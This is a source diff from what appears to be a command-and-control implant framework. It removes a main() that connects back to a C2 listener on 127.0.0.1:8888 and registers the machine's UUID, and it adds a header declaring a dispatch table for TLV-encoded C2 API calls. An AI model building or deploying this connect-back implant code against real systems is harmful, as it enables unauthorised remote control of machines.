@@ -22,61 +22,41 @@
  * SOFTWARE.
  */
 
-#include <stdlib.h>
-#include <stdio.h>
-#include <unistd.h>
+#ifndef _API_H_
+#define _API_H_
 
-#include <sys/socket.h>
-#include <netinet/in.h>
-#include <arpa/inet.h>
-
+#include <tlv.h>
 #include <c2.h>
-#include <machine.h>
 
-int connect_to(char *host, int port)
+#include <uthash/uthash.h>
+
+#define TAB_API_CALL 1
+
+enum api_call_statuses {
+    API_CALL_QUIT,
+    API_CALL_SUCCESS,
+    API_CALL_FAIL,
+    API_CALL_WAIT,
+    API_CALL_NOT_IMPLEMENTED,
+    API_CALL_USAGE_ERROR,
+    API_CALL_RW_ERROR,
+};
+
+typedef tlv_pkt_t *(*api_t)(c2_t *);
+
+typedef struct api_calls_table
 {
-    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    int tag;
+    api_t handler;
+    UT_hash_handle hh;
+} api_calls_t;
 
-    if (sockfd == -1)
-        return -1;
+tlv_pkt_t *api_craft_tlv_pkt(int);
+tlv_pkt_t *api_call_make(api_calls_t **, c2_t *, int);
 
-    struct sockaddr_in hint;
-    hint.sin_family = AF_INET;
-    hint.sin_port = htons(port);
-    hint.sin_addr.s_addr = inet_addr(host);
+void api_calls_register(api_calls_t **);
+void api_call_register(api_calls_t **, int, api_t);
 
-    if (connect(sockfd, (struct sockaddr *)&hint, sizeof(hint)) != 0)
-        return -1;
+void api_calls_free(api_calls_t *);
 
-    return sockfd;
-}
-
-int main(int argc, char *argv[])
-{
-    c2_t *c2 = NULL;
-
-    if (strcmp(argv[0], "p") == 0)
-    {
-        int c2_fd = (int)((long *)argv)[1];
-        char uuid[UUID_SIZE];
-
-        if (machine_uuid(uuid) < 0)
-            return 1;
-
-        c2_add(&c2, 0, c2_fd, uuid);
-    } else
-    {
-        int c2_fd = connect_to("127.0.0.1", 8888);
-
-        char uuid[UUID_SIZE];
-
-        if (machine_uuid(uuid) < 0)
-            return 1;
-
-        c2_add(&c2, 0, c2_fd, uuid);
-    }
-
-    c2_init(c2);
-
-    return 0;
-}
+#endif /* _API_H_ */
